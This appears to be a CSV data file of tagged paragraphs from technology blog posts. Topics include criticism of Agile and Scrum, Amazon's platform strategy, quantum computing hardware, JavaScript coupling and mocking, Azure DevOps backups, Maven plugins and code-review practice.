2170,"Robert C. Martin recently pointed out, the Agile approach itself was a reaction to a crisis in software development: Since the birth of the software industry, the number of programmers doubled every five years. This means half of the programmers hold less than 5 years of experience. Constantly a lot of positions need to be filled quickly. Martin stresses that, where Alan Turing was convinced programming had to done by disciplined mathematicians, today it is predominantly undisciplined young males who were brought into these positions. What they lack in experience and professional discipline they are willing to make up in effort, willing to working crazy hours. They can be hyper-focused, but sometimes on the wrong things. Calmititious and most important for business: those kind of developers are available and they tend to be inexpensive. But fatally an efficient business discipline coupled to an undisciplined engineering team will very rapidly make a mess.","['Agile', 'Scrum', 'Crisis', 'Rationalization', 'Software Industry']",12
2171,"Out of this situation, the Agile movement arose: It tried to identify common patterns applied in software development, which actually worked. And it looked into the greatest common factors as guidance and how the values linking them together relate. At the core they proclaimed: This Manifesto is said to be the foundation for the rise of Agile methods. The Processes associated with Agile today are such processes as Scrum, Kanban, Extreme Programming and alike. Defacto Scrum became almost synonymous with Agile. With roughly 85% of projects who are self-identified as agile are also self-identified as Scrum.","['Agile', 'Scrum', 'Crisis', 'Rationalization', 'Software Industry']",12
2172,"According to Martin Fowler up to 2016 Agile has become mainstream and is not any longer exotic or frowned upon on, as in the early days. But at the same time where Agile has become established, a growing number of people, including prominent signatories of the original Agile Manifesto are dissatisfied with the state of affairs. Fowler denounces a lot of modes of operations, labeled Agile as, Flacid Agile or Dark Scrum. According to him, agile values have been corrupted mostly for three reasons: First, an ever-growing agile-industrial complex. This agile-industrial complex just briefly trains people, provides shiny few-day-certificates and pushes those people into consulting or managing positions. This has led to over-emphasizing formal rules at the cost of the lack of recognition of technical excellence by able and experienced engineers. And thirdly focusing on projects instead of products. Instead of connecting developers with clients and focusing on quality, the deadline and finishing of the project is prized.","['Agile', 'Scrum', 'Crisis', 'Rationalization', 'Software Industry']",12
2173,"Robert C. Martin puts forward a slightly different focus: While he agrees with most of Fowlers observations, he comes to the conclusion that there is a divide in the agile community. Claiming only the Software Craftsman- and women stayed the course and true to the original Agile values. Being one of the leading figures in the Software Craftsmanship combine he emphasizes the individual responsibility of the Craftsperson, to uphold the values of Agile and well-crafted software against any opposing forces. But he also acknowledges that the agile movement was overtaken by project managers who misunderstood it as a new methodology for managing software projects and not caring much about the guiding values it was founded upon. Where Kent Becks goal in 2001, for the Agile movement, was to heal the divide between programmers and management this divide prolongs today. Those Hoards of products managers, having certificates but no understanding of how developing reliable software works, took over the Agile movement and created the Agile Split: Practitioners of Software Craftsmanship following Technical Practices versus project managers pushing forward Business Practices. Which led to the Programmers fleeing from Agile.","['Agile', 'Scrum', 'Crisis', 'Rationalization', 'Software Industry']",12
2174,"As a freelancer in mobile computing, I have worked with a lot of companies of all different sizes. From small start-ups, fancy digital agencies and big companies like major internet providers, media companies and insurances based in Germany and Asia. Doing some kind of Scrum has been the defacto standard mode of operations for most of them since 2011. But I also worked with companies just during their transition period towards agile. And some companies I have visited before and after they claimed to be Agile. According to my experiences, all of the observations made by Hunt, Fowler and Martin are true.","['Agile', 'Scrum', 'Crisis', 'Rationalization', 'Software Industry']",12
2175,"And they all the critical practitioner s of Agile came to a similar conclusion: People are just not doing it right. But they disagree on the deeper reasons why, and how to fix that. Do we need to fix it? Or is something down reaching going on and Agile wont help us with that no matter what? In my experience, most companies doing good working with claiming to be agile also did very well without. At least Martin seems to be already aware of this.","['Agile', 'Scrum', 'Crisis', 'Rationalization', 'Software Industry']",12
2176,"Jeffries also points us to the hard and methodical answers which should be used: Incremental Development Acceptance Testing Incremental Design Refactoring Programmer Testing (typically done by Test Driven Development)Continuous Integration Those are all well-known practices, that for certain will stay in the industry for good, even once it moves past Agile. And yes: They are useful and make us more efficient. But everything Jeffries describes also happens in teams which follow all those practices. But much unlike many others, he realizes that there is an imbalance of power between developers and power holders. Good software can only be delivered when the team follows their professional practices. But within Scrum it still is the responsibility of the developers to hold the management in check: Jeffries is convinced Dark Scrum can be moved to *real* Scrum. By an effort of the developers and by improving education on Scrum in general.","['Agile', 'Scrum', 'Crisis', 'Rationalization', 'Software Industry']",12
2177,"The last barrier defending Agile usually is the mythical waterfall. As soon as somebody criticizes Agile this person usually is reminded that at least ist better than the old waterfall model of software development. Because before we were rescued by Agile everybody was using the waterfall model, which was totally wrong, Right? Ironically the waterfall never existed as such. The iconic slides illustrating the waterfall model first appeared in an article by Winston Roye in 1970 about problems in IT Project management of large software systems. However, he never used the word waterfall as there was no such thing as a waterfall method at that time. Ogura Toshihide traced the term waterfall back to the article Software requirements: Are they really a problem?","['Agile', 'Scrum', 'Crisis', 'Rationalization', 'Software Industry']",12
2178,"The truths of the agile manifesto seem to hold true self-evident. But the shortcomings in analyzing why exactly they do not work out as planned is baffling. Are we all too soft on agile? Is the emperor naked and nobody dares to openly speak the truth? A big misconception, blocking our understanding of the nature of Agile, is the idea Agile is overcoming Taylorism as Fowler suggested. Like the waterfall-myth, this does not hold true, upon closer inspection: Writing and engineering software is (maybe soon: used to be?) It is inherently different from manufacturing goods and can not easily be rationalized. But working in the common Agile Processes as suggested by Scrum or Kanban is as close to working in an assembly line as writing software can be: Work is broken down into the smallest and easiest steps possible The pace of the work is controlled, measured and managed The ultimate goal is to make the software-worker disposable by the process and even the gap between highly experienced engineers and less skilled members of the team. This is done for the benefit of productivity and predictable quality of the resulting product, in a way that aims to be as reproducible as possible. However, by doing this, Pioneers and Geniuses on the one end and Spaghetti-Script-Cowboys on the other end of the spectrum are not longer indisposable and are clearly out of date.","['Agile', 'Scrum', 'Crisis', 'Rationalization', 'Software Industry']",12
2179,"Slicing work and eliminating required skill as much as possible by leveraging pre-defined processes is the heart of Taylorism. But the software industry does not mass assemble the same model of a car over and over again as 20th century Fordism did and can not just copy the assembly line. And even manufacturing moved away from this approach. If we look at some other aspects of Agile Production processes, we see more aspects which also emerged in modern mass production such as: Controlling and maintaining high quality is in the center of __url__ control of productivity, with the goal of eliminating failures and maximizing resource usageintegration of the staff into production by an emphasis on teamworkmore autonomy in decision making on the site of actual productionflat hierarchies and de-emphasizing of status symbols These all are also elementary components of modern management methods, developed in Japan, and often labeled as Toyotismus. Some Sociologists identify Toyotism as post-Fordism. Some as neither pre- nor post-Fordism. But as Taylorism, Toyotism is also a highly rationalized process and they have much in common.","['Agile', 'Scrum', 'Crisis', 'Rationalization', 'Software Industry']",12
2180,"The Agile Movement has been over-idealized. In part due to the original protagonist which were enthusiastic about the Agile Values. This enthusiasm was amplified by the Agile Industrial Complex, quickly growing a business out of it. Considered sober, the shift towards Agile changed the ways of the software industry. But at the end of the day, it is just a rationalization in software production comparable to other rationalization processes in other industries. It modernized how we are doing our work, but it is more driven by the quest for efficiency than by values. Ironically the efficiency cannot fully unfold when the values are disregarded.","['Agile', 'Scrum', 'Crisis', 'Rationalization', 'Software Industry']",12
2181,"And the issue of trust cannot be addressed without looking at the problem of power. Agile, especially Scrum, is more about efficiency than about empowering developers and it is not a shift away from Taylorism. On closer inspection, this will be visible in every single conflict within companies trying to transform towards Agile. Quite the opposite is true: it makes people more replaceable and controllable and is a modern and competitive form of Management. But when the power holders become invincible and teams start to impose control on themselves, conflicts are avoided and responsibility becomes concealed. The Humane promise of Agile is broken.","['Agile', 'Scrum', 'Crisis', 'Rationalization', 'Software Industry']",12
2182,"Within the scope of this article, I can only sketch out which questions need to be raised and where the Agile community has some blind spots. But I think the points, which we only reluctantly want to tackle, are probably most worthy of our attention. Keeping the software industry a great place to work requires a deep reflection on Agile and where we as developers and human beings want to go. And how we want to unfold the power of the machines for the better of humankind. The digital Industry is already shaping the future of work, but how can we take better control of it? This Article is a primer and invitation for discussion and a call for looking deeper into the Crisis. Please contribute and let me know your thoughts. [1] Robert C. Martin, 2016: The Future of Programming[2] Empirical Evidence of Agile Methods, presented by Grigori Melnik, at Microsoft Summit 2017, see also Stack Overflow Developer Survey 2018 [3] Martin Fowler, 2018: The State of Agile Software in 2018. [4] The term agile industrial complex was originally coined by Daniel Mezick in late 2016. Daniel Mezick, 12.12.2016: The Agile Industrial Complex [5] The Future of Programming see Footnote 1, 1:07 and following. [6] see Footnote 1 and Robert C. Martin, 28.8.2018: The Tragedy of Craftsmanship. [7] Andy Hunt 5.6.2015: The Failure of Agile [8] Andy Hunt 7.11.2016: Stop Practicing and Start Growing [9] I assume the reader agrees with the defensive stance of agile advocates by now. A deeper discussion is beyond the scope of this article. [10] see Wikipedia on No true Scotsman [11] Ron Jeffries, 8.9.2016: Dark Scrum [12] Tanner Worthham, 3.11.2018: How To Spot an Agile Imposter at Your Next Interview[13] A mix of Scrum and Kanban[14] Winston Royce, 1970: Managing the development of large Software Systems [15] A recommended introduction on this misunderstanding was published by Tobias Pfeiffer, 2.3.2012: Why Waterfall was a big misunderstanding from the beginningreading the original paper. Ogura Toshihide points to his own research (which is only published in Japanese) in the comments. Some of his thoughts, like his obsession with relying on excessive documentation, are not agile at all and would be considered clearly out of date today. A comprehensive and continuously growing list of Agile Thought Leaders who speak out against any imposition of agile processes (the term is a contradiction in itself) is compiled in the concluding part of this article. [20] Manuel Castells, Das Informatiomszeitalter, 2nd Ed. Cf Toyotismus Kooperation zwischen Management und Belegschaft, multifunktionale Arbeitskraft, totale Qualittskontrolle und Reduktion von Ungewissheit. The original trilogy on The Information Age was first published in English. Part 1 as The Information Age: Economy, Society, and Culture, Volume 1: The Rise of the Network Society in 1996. [21] Rasmus Kaae, 19.12.2016: History of Kanban [22] Empirical Evidence of Agile Methods, presented by Grigori Melnik, at Microsoft Summit 2017 [23] Martin Fowler, 14.12.2006: Semantic Diffusion.","['Agile', 'Scrum', 'Crisis', 'Rationalization', 'Software Industry']",12
2183,"According to this Google Platforms Rant, there was one thing that Google was doing wrong, and Amazon was doing right. That one thing was a focus on building platforms. Yegge wrote that Amazon CEO Jeff Bezos had issued a mandate back in 2002 to the entire organization. The central requirement was as follows: It didnt matter what the underlying technology was. What was important was that services were consumed through defined service interfaces. There was to be no direct linking, shared databases or memory, or back-doors. But it had to be a service interface, accessed over the network.","['Cloud Computing', 'Platform']",16
2184,"There can be grey areasits helpful sometimes to think of platform vs product as a spectrum. For example, Slack has some elements that make it like a platform. There are companies that are extending Slack by building new products on its core platform. Thats OKbut Im arguing for something bigger. Because the most powerful question to ask in the context of platforms is an order of magnitude more powerful: They key point for a powerful platform is that creativity and innovation is not limited by the team building the original softwarethat it can be extended in ways not conceived by the original designers. If your platform allows other people to solve problems you werent even aware of it can become massive.","['Cloud Computing', 'Platform']",12
2185,"That was the realization that prompted his famous memo. When Ben Thomson (Stratechery) reflected on the outcome of Amazons strategy he quoted an origin story from Brad Stone, from his book The Everything Store: So Amazon set about offering infrastructure functionality as a set of primitives, which developers can build on top of. These primitives are well known to us now: storage (S3), compute (EC2), queuing (SQS), etc. Since that time, AWS has continued to build out new services to complement, integrate with and build on these early primitives. Today there are over 90 services across 20 categories.","['Cloud Computing', 'Platform']",10
2186,"They are designed in such a way that places no real limitations on what a developer team can achieve using AWS. For example, maybe Bezos would have eventually stumbled upon the idea to build a Dropbox. The point ishe didnt have to. Drew Houston had the idea and was able to access globally scalable resources to make it happen because AWS was there.","['Cloud Computing', 'Platform']",10
2187,"As Yegge lamented: Theres a bit to unpack here, and Im moving that discussion to another post. In the meantime, heres a platform checklist to answer the question, are we building a platform? Can external developers get access to your platform? Eventually is the same as no and is 0 points. Specifically, do you use the same platform to build your products that you are asking your customers to use? (Using exactly what your customers use = 1 point. Using bits of it, having back doors, or your own special private APIs = 0 points. )Can you monitor their access (do you know if they have problems before they tell you)? Sometimes or kinda or there are log messages somewhere, Im sure I can find them is the same as no and is 0 points. )How long does it take a developer to create their first Hello World program built using your platform? (Anything less than 1 hour = 1 point. )How long does it take a developer to solve their first real customer problem using your platform? (Anything less than 1 week = 1 point. )Companies like Amazon have scored 5/5 for nearly 10 years now. We have a long way to go. But this is what we need to do: by the end of 2019, we need to score 5/5.","['Cloud Computing', 'Platform']",10
2188,"Its not just at the code level. Its even more important to think about this when designing systems. Almost every time I review a design I have to ask what happens when this component fails or what happens if the caller sends you bad data or what happens if you all of a sudden got 10 times more traffic? and a common response is uh When you are exercising your design with scenarios, you have to ruthlessly think about failure scenarios. Its your responsibility as a professional. Come up with as many failure scenarios as you can think of, and understand how the system will handle it.",['DevOps'],13
2189,"You also need to ask yourself, how will someone quickly identify and fix a problem when (not if, but when) something goes wrong? More and more we all have to deal with complex distributed systems. Distributed systems mean lots of interacting components. Which means that the likelihood of failure increases, until you reach a point where failure is almost guaranteed. Leslie Lamport, one of the seminal thinkers on distributed systems theory, once said Sometimes we build overly complex and slow development processes in an attempt to prevent any failure from happening. But no matter what you do, things are going to fail, particularly in distributed systems. So its really important to also focus on reducing mean time to recovery (MTTR).",['DevOps'],13
2190,"In quantum computers, many university research groups bet on trapped ions. But the industrial giants do not necessarily agree with that. Indeed, the superconducting circuit seems to be their top choice. Ironically, some of those decisions are not completely based on the technical merit. Many universities have strong expertise in Atomic Physics and have the know-how on manipulate quantum information in the atomic level. But scaling up the solution is not necessarily their strength. On the other hand, many industrial corporations acquire semiconductor experts with years of experience in scaling systems. Instead of using atoms to store quantum information, engineers print artificial quantum system in a circuit for the qubits (where quantum computers store information). Therefore, different organizations may adopt different approaches depending on their expertise. In this article, we will focus on the superconducting circuit and reserve another article for the trapped ion quantum computer. But we will have a high-level overview for some of the most promising approaches at the end of the article. Nobel prizes were given (including Superconducting, Josephson Junction) for theories mentioned in this article. So feel free to skip some details if it is not explained thoroughly.","['Science', 'Software Development', 'Artificial Intelligence', 'Physics', 'Programming']",5
2191,"Maintain an extremely low temperature is important in a superconducting quantum computer. This dilution refrigerator has a system of pipes that contain a mixture of two helium isotopes (isotope and ). As the lighter isotope is diluted into the heavier isotopes inside the mixing chamber below, it absorbs heat as the entropy increasesa mixed solution is more disorder and has higher entropy. So the temperature surrounding the mixing chamber will drop. The mixing chamber is connected to the upper distilling chamber. Since isotopes has a higher boiling point, it will vaporize. This reduces the concentration of isotopes and draws more isotopes to be diluted into the mixture in the other end, i.e. So the cooling process creates a cycling circle.","['Science', 'Software Development', 'Artificial Intelligence', 'Physics', 'Programming']",5
2192,"Trapped ions quantum computer is another popular realization of quantum computers. We trap ions (for example, positively charged Calcium ions) with oscillating electrical field inside a high-vacuum chamber. We laser-cooled the ions so it is close to stationary. A string of ions is formed and float between electrodes. Scientists have studied Atomic Physics for a century. We know its different energy states and how to manipulate between them. i.e., we know how to use these ions to create qubits. To manipulate and to measure the qubits, we shine lasers of different frequency and duration to the ions.","['Science', 'Software Development', 'Artificial Intelligence', 'Physics', 'Programming']",5
2193,"The following is a recap on the superconducting and trapped ions quantum computer: Comparison Trapped ions have longer coherence time compared to a superconducting circuit but the gate operation time is faster in the superconducting circuit. Google has built a 72-qubit superconducting quantum computer in March 2018. As we write this article (Dec. 2018), Ion Q has just announced a 79-qubit quantum computer. The competition is fierce and in an early phase. It is hard to determine who is the winner for now. Trapped ions need a vacuum chamber while the superconducting needs a diluted refrigerator. Trapped ions are all natural and identical while the gate performance for each qubit in the superconducting computer is slightly different. Not all qubits in a superconducting computer are connected to form 2-qubit operations. But, as the number of trapped ions increases, trapped ions are suspectable to noises and the error rates become intolerable. Superconducting circuits work with microwaves while trapped ions system often involves lasers which are harder to integrate into the system.","['Science', 'Software Development', 'Artificial Intelligence', 'Physics', 'Programming']",5
2194,"Atomic does not interact with other so it can be a bad candidate for the purpose of building 2-qubit operations. But with timed laser pulses, the outermost electron can be excited. It inflates the atom to billion times and reaches the Rydberg statewhich the electrons are excited to a high principal quantum number close to 100 and become sensitive to external influences including microwave radiation. it behaves more like an ion that can interact with neighboring atoms. This behavior will be exploited to create entanglement. Currently, researchers are still working on the gate fidelity (error rate).","['Science', 'Software Development', 'Artificial Intelligence', 'Physics', 'Programming']",5
2195,"To remove coupling, we first need a better understanding of where coupling dependencies come from. Here are the main sources, roughly in order of how tight the coupling is: Tight coupling: Class inheritance (coupling is multiplied by each layer of inheritance and each descendant class)Global variables Other mutable global state (browser DOM, shared storage, network, etc)Module imports with side-effects Implicit dependencies from compositions, e.g., const enhanced Widget Factory = compose(event Emitter, widget Factory, enhancements); where widget Factory depends on event Emitter Dependency injection containers Dependency injection parameters Control parameters (an outside unit is controlling the subject unit by telling it what to do)Mutable parameters Loose coupling: Module imports without side-effects (in black box testing, not all imports need isolating)Message passing/pubsub Immutable parameters (can still cause shared dependencies on state shape)Ironically, most of the sources of coupling are mechanisms originally designed to reduce coupling. That makes sense, because in order to recompose our smaller problem solutions into a complete application, they need to integrate and communicate somehow. There are good ways, and bad ways. The sources that cause tight coupling should be avoided whenever its practical to do so. The loose coupling options are generally desirable in a healthy application.","['JavaScript', 'Technology', 'Functional Programming', 'Tdd']",15
2196,"Pub/sub is also baked into Redux. In Redux, you create a global model for application state (called the store). Instead of directly manipulating models, views and I/O handlers dispatch action objects to the store. An action object has a special key, called type which various reducers can listen for and respond to. Additionally, Redux supports middleware, which can also listen for and respond to specific action types. This way, your views do not need to know anything about how your application state is handled, and the state logic does not need to know anything about the views.","['JavaScript', 'Technology', 'Functional Programming', 'Tdd']",15
2197,"The strategy used by redux-saga is to use objects that represent future computations. The idea is similar to returning a monad, except that it doesnt always have to be a monad that gets returned. Monads are capable of composing functions with the chain operation, but you can manually chain functions using imperative-style code, instead. Heres a rough sketch of how redux-saga does it: You can see all the calls being made in your unit tests without mocking the network API or invoking any side-effects. Bonus: This makes your application extremely easy to debug without worrying about nondeterministic network state, etc Want to simulate what happens in your app when a network error occurs? Simply call iter.throw(Network Error)Elsewhere, some library middleware is driving the function, and actually triggering the side-effects in the production application: Destructure the call() object from the yielded value to inspect or invoke the future computation: Effects run in the real middleware. You can skip this part when youre testing and debugging.","['JavaScript', 'Technology', 'Functional Programming', 'Tdd']",15
2198,"Lets look at a common example. People try to tell me that the express server definition file needs dependency injection because how else will you unit test all the stuff that goes into the express app? : In order to unit test this file, wed have to work up a dependency injection solution and then pass mocks for everything into it (possibly including express() itself). If this was a very complex file where different request handlers were using different features of express, and counting on that logic to be there, you would probably have to come up with a pretty sophisticated fake to make that work. I've seen developers create elaborate fakes and mocks of things like express, the session middleware, log handlers, realtime network protocols, you name it. I've faced hard mocking questions myself, but the correct answer is simple.","['JavaScript', 'Technology', 'Functional Programming', 'Tdd']",9
2199,"You could test it something like this. Swap out the if statement for your favorite test framework expectation: Pull the listen handler into its own file and write unit tests for it, too. We have the same problem here. Express handlers are not pure, so we need to spy on the logger to make sure it gets called. Testing is similar to the previous example: All thats left in the server file now is integration logic: You still need integration tests for this file, but further unit tests wont meaningfully enhance your case coverage. We use some very minimal dependency injection to pass a logger into handle Listen(), but there is certainly no need for any dependency injection framework for express apps.","['JavaScript', 'Technology', 'Functional Programming', 'Tdd']",15
2200,"My muscle memory started to adapt. I grew accustomed to their streamlined approach to workspaces. I started appreciating that every time I hit my Super keythinking Id be taken to an instant search for the app I want I was instead given a list of OS-wide keyboard shortcuts. Which means you pick up new tricks every time you make that mistake. (In elementary OS, Super + Spacebar brings up your Applications menu. You can also change the Super key shortcut that brings up the said menu. )And one of those shortcuts I stumbled across is Picture-in-Picture mode (Super + F).","['Linux', 'Elementary Os', 'Desktop', 'Operating Systems']",19
2201,"But, the interesting fact about WSO2 Siddhi is the summarization over a long time duration. It has a very unique and powerful feature incremental aggregation to handle summarization over a long time duration. Incremental aggregation is achieved in WSO2 Stream Processor due to its deep alignment with the Lambda architecture. Incremental aggregation allows you to obtain aggregates in an incremental manner for a specified set of time periods. This not only allows you to calculate aggregations with varied time granularity, but also allows you to access them in an interactive manner for reports, dashboards, and for further processing. Its schema is defined via the aggregation definition.","['Big Data', 'Stream Processing', 'Wso2', 'Cep', 'Integration']",8
2202,"On the top right corner of the Azure Dev Ops portal we have our account picture. Clicking on it reveals the account menu where we find a Security option. Inside Security, we have Personal access tokens. We click on New token to create one. For this example we only need to check the Read, write & manage permission for Code. When we name the token and click Create, we get the token value, but since it wont be shown again, we must copy and save it elsewhere. We will need this token later, to access the API.","['Azure Devops', 'Csharp', 'Backup', 'Git', 'Visual Studio']",7
2203,"To get the sample code, we can clone this Git Hub repository and open it with Visual Studio. To test the solution in debug mode, we still have to configure a few arguments in the project properties. These arguments will define the access tokenobtained on the previous step, organizationi.e. the Azure Dev Ops domainand the local directory where we want to write the backed up data. There is a fourth optional argument to state if we want to unzip the downloaded filesmore on that later. Heres how the argument list will look like: This solution uses two external libraries we need to reference: Rest Sharp to facilitate the API calls and Newtonsoft JSON to deserialize the API responses into objects.","['Azure Devops', 'Csharp', 'Backup', 'Git', 'Visual Studio']",15
2204,"Now, imagine how your websites visitors feel when they have to sit around and wait for your site to load in their browser window. And they havent even committed to being there at a certain time or place. Theyre there of their own accord. What do you think theyll be inclined to do if one web page takes ten seconds to load? The importance of speed in any encounter you have with a prospective lead or current customer can never be underestimated.","['Web Development', 'WordPress', 'Wordpress Development', 'Optimization', 'Guides And Tutorials']",17
2205,"But, really, is it their fault for thinking this way? Weve all been taught that technology is supposed to make everything easier and quicker and simpler. So, why doesnt every website load instantly? Without getting too technical, here is whats happening when a visitor tries to open your website: Person finds your website. From a link, a high-authority website shared to it. By typing in your URL in the address bar. However they learned about your site, they want to now see it.","['Web Development', 'WordPress', 'Wordpress Development', 'Optimization', 'Guides And Tutorials']",17
2206,"This is the speed analysis tool you should be using: Googles Page Speed Insights: For the purposes of this test, Im going to use my favorite bakery/cafes website: Flour Bakery. I specifically chose this website because:1. Its chock full of mouth-watering images (which I hope compel visitors to peruse the entire website and then stop in because this place is amazing).3. There are 201 indexed pages on the website.4. Among those pages are a number of links out to complex activities, like ordering ahead, looking up directions to various locations, purchasing food from the shop, and so on. There is also a video embedded on a few pages. Although theyre not handling any of those activities on the site, its a good indicator that theres a lot of interest from visitors to engage with these elements which means traffic is probably high.5.","['Web Development', 'WordPress', 'Wordpress Development', 'Optimization', 'Guides And Tutorials']",6
2207,"Further Reading: Maven Surefire Plugin Ensuring code is actually tested is critical. A good metric to determine if code has been tested is Code Coverage. It is not a perfect metric and you should probably never require 100% coverage. But it is a great way to ensureat least some level of compliance with testing. But then again we all follow TDD to a tee and this should not be a problem, right? There are two big players when it comes to code coverage, Jacoco and Cobertura.","['Java', 'Maven', 'Ci Cd Pipeline']",13
2208,"Further Reading: Maven Source Plugin Sometimes it becomes necessary to rollup all your dependencies into a single jar file. This can be useful when running scripts. You can have problems with class path conflicts, fileduplication and other files colliding,None of the tools for building fat jars are perfect but I've had the best luck with the shader plugin. One thing it does really well is join spring, and services jars. These jars usually have files that reside in the jar's MANIFEST folder. But when building a fat jar they will often collide causing you to loose some necessary configuration information. The shader plugin will avoid this by merging and combining these files as best as it can.","['Java', 'Maven', 'Ci Cd Pipeline']",7
2209,"From the very first pages, I realised that Im in for something unusual. He became interested in programmers as they became widespread, some even moving into his neighbourhood. (The book shows its age in noting that many were women.) Despite the proliferation of the profession, nothing much was written about the work relationship between programmers and their managers. If the topic was mentioned at all in some management literature, the portrayal of programmers was usually not flattering. So the author decided to fill the gap.","['Programming', 'Management', 'Career Advice', 'Anthropology', 'Software Development']",2
2210,"Being an anthropologist, he studied each by observation, attempting to figure out what was really happening. First, he identified that despite dozens of titles, he could partition all software workers into three groups: coders (technicians), programmers and analysts. Coders did least creative jobs, mostly just punching characters. Programmers worked on all aspects of writing a program, but in an organisation they could be further specialised. Their job, while more creative than that of coders, still involved a lot of routine. Analysts designed full systems and broke them into parts to be implemented by programmers. Their job was most loosely defined, since it often involved managerial and sales elements, and represented in microcosm internal conflicts present in many of the organisations.","['Programming', 'Management', 'Career Advice', 'Anthropology', 'Software Development']",12
2211,"He then spotted that, as a trend, this division mimicked class divisions present in other engineering jobs. (Implying America has social classes in 1970's is probably the most sure way to not get your book read) Coders usually had little tertiary education. Programmers had vocational training from a community college. Analysts came from elite technical universities. This educational background correlated with the occupations of their parents. Generally, coders came from families of much more modest means compared to analysts.","['Programming', 'Management', 'Career Advice', 'Anthropology', 'Software Development']",2
2212,"To rub some salt into my wounds, the author then went over techniques employed by managers to keep programmers happy and create a sense of career growth. From dual career ladders (where one can progress as an engineer or as a manager), out of which one is in practice always much shorter, to title changes without much difference in the essence of the work, to regular pay increments until you get firedmost of these are omnipresent in a modern software shop. In most of them, only managers get real career growth: they manage a team, then a product area, and then move to defining policies and no longer manage. The growth on the management ladder brings executive authority in allocating resources and pursuing business opportunities. The growth on the engineering ladder, once you are an analyst, at best brings more responsibility and accountability. (The author observed that the growth from coder to a programmer to an analyst is, in practice, also elusive. Often there are educational barriers associated with a higher position, effectively confining coders to coding. Not something Ive ever observed directly, given that throughout most of my career my coworkers had stellar academic credentials or even Ph Ds. Yet, Ive witnessed people denied promotion due to lack of education in traditional factories, so its not hard to believe that this is the case in many workplaces that employ software workers too. )Then there are tools for control. Chief of them is insisting on individualism and a perverse definition of professionalism. Individualism is routinely stressed in a workplace, for example, by insisting that pay information is private. The fact that people square in their heads the belief in individual treatment with salary bands attests to incredible capacity of human mind for dealing with cognitive dissonance.","['Programming', 'Management', 'Career Advice', 'Anthropology', 'Software Development']",2
2213,"Before I dive in, however, I want to answer the question that inspired me to write this blog post in the first place. That is, why do we want to pause a subscription? But theres a problem Netflix doesnt provide such an option for me to do so. Or in a more general sense, what would the user flow look like? Well, I imagine it would be something like this: User (me) cancels subscription to Netflix User subscribes again sometime later (when I inevitably get drawn back in)If we take the perspective of a user or customer, having the option to pause a subscription may not seem like a big deal. Sure, its convenientbut its not that much of a hassle to just cancel the subscription, and resubscribe later on, right? To understand, we have to take a look at the other side. From the point of view of a business, retaining customers is absolute vital, for increasing customer retention rates leads to increases in profits. A reason for this is that it is far less expensive for any business to retain current customers than to acquire new ones, or in this case, win back those who have cancelled their subscription.","['Stripe', 'API', 'How To', 'Technology', 'Payments']",17
2214,"This post is about code-reviews; specifically, its about my experience changing my code-review style. This is not about how everyone does or should do code-reviews, nor does it have amazing numbers to prove why any technique is an objectively better way. The only clear action item or learning that I hope to inspire is: Default code reviews restrict creativity, morale, and enthusiasm Use light-touch suggestions and lead with inquiry to get the best out of your colleagues and build a culture of learning Use some handy techniques to make the process easier Explore the cognitive neuroscience basis for why this works The default style of code-reviews Ive practiced has one major goalto maintain quality of the code-base. A few engineers initially architect a solution; the team then expands and they guide other engineers towards doing the right thing as defined by the convention or structure laid out. For example: This wont work with XThe code here uses the X pattern; youll need to do Y instead of this Often, these few engineers are outnumbered by the larger, newer team working on this and the review feedback gets progressively shorter: Change X to YDo XIts really important to note these are not dysfunctional or nasty reviewsthese are legitimate, well intended, and respectful comments. Whats more: they represent concise, clear and actionable feedback.","['Software Development', 'Neuroscience', 'Teamwork', 'Pull Request']",12
2215,"By presenting my perspectives as objective truth, I ran the risk of drowning out new information. Without understanding the newer axioms that the reviewee was operating with, we would continue to reason in parallel lines that never converged. This could either result in standoffs (where both me and the reviewee feels frustrated with the change) or complacency (where the my outdated ideal state persists). Eventually, when the reviewee convinced me about their idea, I would say something like: Of course, that makes a lot of sense! I didnt realize this is what you were going for earlier. It seems like we were both attempting to solve for the same thing! Second, I realized that a lot of my code-review feedback was was telling my colleagues exactly what to do. In the pursuit of clarity, I would present concise and actionable feedbackwithout too much context. Much of this ended up reading like a directive that would probably leave little room for autonomy. Sometimes I would see the enthusiasm drain from a reviewee as I picked away at small conventions, and a quote I once read would come to mind: Third, I realized I was spoiling the best part of software engineering for themsolving a puzzle. Lets say that during a code-review, I identify an edge case that might cause a function to error out. I would typically point out the edge case with some examples: I dont think the code works for all casesfor example, when foo is [1, 3], and bar is [3, 5], wouldnt trying to remove 5 from foo cause a Key Error? This would lead to a response like: Oh duh! Youre right I cant believe I missed that! :facepalm: Something was off: the reason that most of us become software engineers is to solve puzzles, and right at the moment that a puzzle is solved the reviewee had a facepalm moment.","['Software Development', 'Neuroscience', 'Teamwork', 'Pull Request']",4
2216,"After much reading and many iterations, I landed on a different style of feedback during code-reviews. This has a different aim: to engage the reviewee in a conversation so that, with our powers combined, we can unlock cool new solutions. (Full Disclosure: I find this style not just more effective but also fun.) For example: There are three major differences in the two styles: these correspond to the three areas of improvement identified earlier. These are: Questions instead of answers Suggestions instead of directives Hints instead of solutions When I started using the language of suggestions, an interesting thing happenedinstead of interpreting my feedback about conventions as ipso-facto true, many times engineers started asking Why? So I started saying Consider doing X because of Y. That led to one of three possibilities: Alright, that sounds reasonable.","['Software Development', 'Neuroscience', 'Teamwork', 'Pull Request']",6
2217,"As Ive used the techniques above, Ive frequently seen colleagues come up with better solutions than what Id presumed possible. This sort of a humbling experience makes it easier to lead with inquiry and apply these techniques the next time around. A positive code-review experience makes it more likely that engineers enter the next code-review with a learning mindset, which in turn makes it easier to have another positive experience. In an industry where change is constant, such a culture of learning is a core competitive advantage. Imagine the compounding effects on your organization by making just a small tweak to this high-frequency process! At Nerd Wallet, one of the responsibilities of every engineer is to help other engineers perform betterand the more senior an engineer grows, the greater their responsibility to coach those around them to perform at their best. If youre interested in joining us on this journey, check out our careers page!","['Software Development', 'Neuroscience', 'Teamwork', 'Pull Request']",0
2218,"We know that data comes from different places and it is most probably random. Database is a place for storing this data but in an organized structure. Knowing what is a database; we now can focus on SQL. It is an abbreviation for Structured Query Language. As the name suggests, its merely a language to query databases.","['Sql', 'Begi', 'Data']",8
2219,"For a number of reasons it is not uncommon for organizations with code quality problems to avoid attempts at improvement. From the perspective of someone new to the organization it may seem odd that developers are working harder than they need to be just to slowly churn through features. These developers are constantly frustrated by the codebase. However, enduring this pain is more comfortable than trying something different. Change is challenging for any organization and most people will think outsiders or newcomers to the organization dont understand their challenges. They may think their professional abilities are being questioned if someone is recommending improvements to how they build software.","['Software Development', 'Refactoring', 'Software Engineering', 'Tdd', 'Clean Code']",12
